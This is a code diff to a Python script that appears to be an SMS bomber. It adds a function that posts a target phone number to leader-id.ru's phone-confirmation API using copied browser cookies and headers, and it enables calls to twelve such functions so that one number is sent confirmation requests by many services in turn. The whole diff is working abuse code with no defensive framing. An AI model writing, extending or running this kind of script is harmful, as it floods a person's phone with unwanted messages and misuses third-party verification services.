@@ -495,14 +495,53 @@ def serv11():
         print(f"serv11 - {response.status_code}")
     except:
         print(f"serv11 - error")
-#serv1()
-#serv2()
-#serv3()
-#serv4()
-#serv5()
-#serv6()
-#serv7()
-#serv8()
-#serv9()
-#serv10()
-#serv11()
+def serv12():
+    try:
+        cookies = {
+            'redirectUrl': '%2Foauth%2Fauthorize%3Fclient_id%3D9d84230270d586a0e88ee509b9f552cc%26redirect_uri%3Dhttps%253A%252F%252Fasi.ru%252Fbitrix%252Ftools%252Foauth%252Fleader.php%253Fbackurl%253D%25252Fauth%25252F%26response_type%3Dcode%26state%3Dsite_id%253Ds1%26backurl%3D%252Fauth%252F',
+            '_ym_uid': '1678219180971834918',
+            '_ym_d': '1678219180',
+            '_ym_isad': '1',
+            '_ga': 'GA1.2.958854515.1678219180',
+            '_gid': 'GA1.2.1395163383.1678219180',
+            '_ym_visorc': 'w',
+            '_gat': '1',
+        }
+
+        headers = {
+            'authority': 'leader-id.ru',
+            'accept': 'application/json',
+            'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7',
+            'content-type': 'application/json;charset=UTF-8',
+            # 'cookie': 'redirectUrl=%2Foauth%2Fauthorize%3Fclient_id%3D9d84230270d586a0e88ee509b9f552cc%26redirect_uri%3Dhttps%253A%252F%252Fasi.ru%252Fbitrix%252Ftools%252Foauth%252Fleader.php%253Fbackurl%253D%25252Fauth%25252F%26response_type%3Dcode%26state%3Dsite_id%253Ds1%26backurl%3D%252Fauth%252F; _ym_uid=1678219180971834918; _ym_d=1678219180; _ym_isad=1; _ga=GA1.2.958854515.1678219180; _gid=GA1.2.1395163383.1678219180; _ym_visorc=w; _gat=1',
+            'origin': 'https://leader-id.ru',
+            'referer': 'https://leader-id.ru/registration',
+            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+        }
+
+        json_data = {
+            'phone': PHONE,
+        }
+
+        response = requests.post('https://leader-id.ru/api/v4/auth/start-phone-confirm', cookies=cookies, headers=headers, json=json_data)
+        print(f"serv12 - {response.status_code}")
+    except:
+        print("serv12 - error")
+serv1()
+serv2()
+serv3()
+serv4()
+serv5()
+serv6()
+serv7()
+serv8()
+serv9()
+serv10()
+serv11()
+serv12()
